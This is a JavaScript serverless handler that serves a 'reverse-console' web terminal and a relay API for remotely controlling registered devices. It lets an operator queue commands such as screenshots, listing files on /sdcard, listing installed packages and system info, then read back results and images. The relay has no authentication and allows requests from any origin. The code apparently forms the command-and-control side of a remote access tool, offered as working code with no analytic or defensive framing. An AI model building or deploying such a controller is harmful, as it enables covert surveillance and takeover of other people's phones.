export default async function handler(req, res) {
    // Serve HTML for browser requests
    if (req.method === 'GET' && !req.url.includes('?')) {
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>reverse-console</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden}
#terminal{width:100%;height:calc(100vh - 40px);padding:10px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;font-size:14px;line-height:1.4}
#input-line{display:flex;position:fixed;bottom:0;left:0;right:0;background:#000;border-top:1px solid #333;padding:8px;height:40px}
.prompt{color:red;margin-right:8px;white-space:nowrap}
#cmd-input{flex:1;background:transparent;border:none;color:#0f0;font-family:'Courier New',monospace;font-size:14px;outline:none;caret-color:#0f0}
.output-success{color:#0f0}
.output-error{color:red}
.output-info{color:#fff}
.command-echo{color:#ff0}
#device-status{position:fixed;top:0;right:0;padding:5px 10px;background:#000;color:#fff;font-size:12px;border-left:1px solid #333;border-bottom:1px solid #333;z-index:1000}
.device-online{color:#0f0}
.device-offline{color:red}
::-webkit-scrollbar{width:8px}
::-webkit-scrollbar-track{background:#000}
::-webkit-scrollbar-thumb{background:#333}
::selection{background:#0f0;color:#000}
</style>
</head>
<body>
<div id="device-status">root@reverse:~# <span id="device-count" class="device-offline">0 devices</span></div>
<div id="terminal"></div>
<div id="input-line"><span class="prompt">root@reverse:~#</span><input type="text" id="cmd-input" autofocus></div>
<script>
var terminal=document.getElementById('terminal');
var cmdInput=document.getElementById('cmd-input');
var deviceCount=document.getElementById('device-count');
var lastId=0,commandHistory=[],historyIndex=-1,screenshotData=null;
function printOutput(text,type){
var line=document.createElement('div');
line.className='output-'+(type||'success');
line.textContent=text;
terminal.appendChild(line);
terminal.scrollTop=terminal.scrollHeight}
function printCommand(cmd){
var line=document.createElement('div');
line.className='command-echo';
line.textContent='root@reverse:~# '+cmd;
terminal.appendChild(line)}
function updateDevices(devices){
var count=devices.length;
deviceCount.textContent=count+' device'+(count!==1?'s':'');
deviceCount.className=count>0?'device-online':'device-offline'}
function sendCommand(cmd){
printCommand(cmd);
fetch('/api/index',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'command',data:cmd})}).catch(function(err){printOutput('Failed: '+err.message,'error')})}
function executeCommand(cmd){
if(!cmd||cmd.trim()==='')return;
cmd=cmd.trim();
commandHistory.push(cmd);
historyIndex=commandHistory.length;
var parts=cmd.split(' ');
var mainCmd=parts[0].toLowerCase();
if(mainCmd==='help'){
printOutput('Available commands:','info');
printOutput('  help              Show this help','info');
printOutput('  clear             Clear terminal','info');
printOutput('  screenshot        Take screenshot','info');
printOutput('  screenshot view   View last screenshot','info');
printOutput('  devices           List connected devices','info');
printOutput('  info              Device information','info');
printOutput('  ls /sdcard        List files','info');
printOutput('  whoami            Current user','info');
printOutput('  uname -a          System info','info');
printOutput('  pm list packages  Installed apps','info');
return}
if(mainCmd==='clear'){terminal.innerHTML='';return}
if(mainCmd==='screenshot'){
if(parts[1]==='view'&&screenshotData){
var win=window.open('');
win.document.write('<img src="data:image/jpeg;base64,'+screenshotData+'" style="max-width:100%;">')}
else{sendCommand('screenshot')}
return}
if(mainCmd==='devices'){
fetch('/api/index?client=web').then(function(res){return res.json()}).then(function(data){
if(data.devices&&data.devices.length>0){
printOutput('Connected devices:','info');
data.devices.forEach(function(d){printOutput('  '+d.info+' (ID: '+d.id+')','success')})}
else{printOutput('No devices connected','error')}})
return}
if(mainCmd==='info'){sendCommand('device_info');return}
sendCommand(cmd)}
function pollServer(){
fetch('/api/index?since='+lastId+'&client=web').then(function(res){return res.json()}).then(function(data){
if(data.messages&&data.messages.length>0){
data.messages.forEach(function(msg){
if(msg.type==='result')printOutput(msg.data,'success');
if(msg.type==='error')printOutput(msg.data,'error');
if(msg.type==='screenshot'){screenshotData=msg.data;printOutput('Screenshot captured. Type "screenshot view" to display.','info')}
if(msg.type==='info')printOutput(msg.data,'info')});
lastId=data.lastId||lastId;
terminal.scrollTop=terminal.scrollHeight}
if(data.devices)updateDevices(data.devices)}).catch(function(err){printOutput('Connection error: '+err.message,'error')})}
cmdInput.addEventListener('keydown',function(e){
if(e.key==='Enter'){var cmd=this.value;executeCommand(cmd);this.value=''}
else if(e.key==='ArrowUp'){e.preventDefault();if(historyIndex>0){historyIndex--;this.value=commandHistory[historyIndex]||''}}
else if(e.key==='ArrowDown'){e.preventDefault();if(historyIndex<commandHistory.length-1){historyIndex++;this.value=commandHistory[historyIndex]||''}else{historyIndex=commandHistory.length;this.value=''}}});
document.addEventListener('click',function(){cmdInput.focus()});
printOutput('Reverse Console v1.0','info');
printOutput('Type "help" for available commands','info');
printOutput('','info');
setInterval(pollServer,1000);
pollServer();
cmdInput.focus();
</script>
</body>
</html>`);
        return;
    }

    // API logic below
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    let messageQueue = global.messageQueue || [];
    let connectedDevices = global.connectedDevices || [];
    let lastId = global.lastId || 0;

    if (req.method === 'POST') {
        const { action, data } = req.body || {};

        if (action === 'register') {
            connectedDevices = connectedDevices.filter(d => Date.now() - d.lastSeen < 60000);
            connectedDevices.push({ id: Date.now(), info: data, lastSeen: Date.now() });
            global.connectedDevices = connectedDevices;
            res.status(200).json({ success: true });
            return;
        }

        lastId++;
        messageQueue.push({
            id: lastId,
            type: action === 'command' ? 'pending_command' : action,
            data: data,
            time: Date.now()
        });

        if (messageQueue.length > 200) messageQueue = messageQueue.slice(-200);

        global.messageQueue = messageQueue;
        global.lastId = lastId;
        res.status(200).json({ success: true });
        return;
    }

    if (req.method === 'GET') {
        const since = parseInt(req.query?.since) || 0;
        connectedDevices = (connectedDevices || []).filter(d => Date.now() - d.lastSeen < 60000);
        const newMessages = (messageQueue || []).filter(m => m.id > since);
        if ((messageQueue || []).length > 500) messageQueue = messageQueue.slice(-300);
        global.connectedDevices = connectedDevices;
        global.messageQueue = messageQueue;

        res.status(200).json({
            messages: newMessages,
            devices: connectedDevices,
            lastId: lastId
        });
        return;
    }

    res.status(200).json({ messages: [], devices: [], lastId: 0 });
}
